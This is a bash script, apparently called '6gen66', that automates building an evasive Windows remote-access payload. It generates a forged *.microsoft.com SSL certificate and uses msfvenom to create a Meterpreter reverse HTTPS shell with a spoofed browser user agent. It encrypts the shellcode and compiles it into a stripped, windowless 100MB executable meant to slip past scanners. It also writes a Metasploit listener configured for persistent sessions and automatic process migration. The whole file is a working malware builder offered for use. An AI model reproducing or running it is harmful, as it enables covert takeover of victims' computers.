#!/bin/bash
# 6gen66 / made by yodazff / github.com/yigit-sozmen

G='\033[0;32m'
BG='\033[1;32m'
R='\033[0;31m'
NC='\033[0m'


cleanup() {
    echo -e "\n${G}[*] Cleaning up temporary files...${NC}"
    rm -f raw.bin payload.h ms_key.key ms_cert.crt ms_unified.pem resource.res 2>/dev/null
}

draw_box() {
    local title="$1"
    local width=60
    echo -e "${G}┌$(printf '─%.0s' $(seq 1 $width))┐"
    printf "│ %-$(($width-1))s │\n" "$title"
    echo -e "└$(printf '─%.0s' $(seq 1 $width))┘${NC}"
}

clear
draw_box "                      6gen66                      "
echo ""


PUB_IP=$(curl -s ifconfig.me)
echo -e "${G}Detected Public IP: ${BG}$PUB_IP${NC}"
read -p "Use for LHOST? [y/n] (y): " CHOICE
CHOICE=${CHOICE:-y}
if [[ "$CHOICE" == "y" ]]; then LHOST=$PUB_IP; else read -p "Enter LHOST: " LHOST; fi

read -p "Enter LPORT (443): " LPORT
LPORT=${LPORT:-443}
read -p "Output Name: " OUTNAME

echo -e "\n${G}┌───────────────┬──────────────────────────────────────────────┐"
printf "│ %-13s │ %-44s │\n" "Task" "Status"
echo -e "├───────────────┼──────────────────────────────────────────────┤${NC}"


printf "${G}│ %-13s │${NC} %-44s ${G}│\n" "SSL Certs" "[*] Generating MS-Unified..."
openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj "/CN=*.microsoft.com" -keyout ms_key.key -out ms_cert.crt &>/dev/null
cat ms_key.key ms_cert.crt > ms_unified.pem


printf "${G}│ %-13s │${NC} %-44s ${G}│\n" "Shellcode" "[*] Venom x64 Reverse HTTPS..."
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=$LHOST LPORT=$LPORT \
    HandlerSSLCert=ms_unified.pem StagerVerifySSLCert=true \
    HttpUnknownUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0" \
    -f raw -o raw.bin &>/dev/null


printf "${G}│ %-13s │${NC} %-44s ${G}│\n" "Enc/Comp" "[*] Compiling 100MB Bloated EXE..."
python3 encryptor.py raw.bin &>/dev/null
x86_64-w64-mingw32-g++ wrapper.cpp -o ${OUTNAME}.exe -static -lntdll -lwininet -Wl,-subsystem,windows -O3 -s


printf "${G}│ %-13s │${NC} %-44s ${G}│\n" "Metasploit" "[*] Rebuilding handler.rc..."
cat <<EOF > handler.rc
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_https
set LHOST 0.0.0.0
set LPORT $LPORT
set HandlerSSLCert $(pwd)/ms_unified.pem
set StagerVerifySSLCert true
set ExitOnSession false
set SessionCommunicationTimeout 0
set AutoRunScript post/windows/manage/migrate
exploit -j -z
EOF

echo -e "${G}└───────────────┴──────────────────────────────────────────────┘${NC}"


cleanup

echo -e "\n${BG}[+] BUILD COMPLETE: ${OUTNAME}.exe (100MB)${NC}"
echo -e "${G}Execute:${NC} msfconsole -r handler.rc"
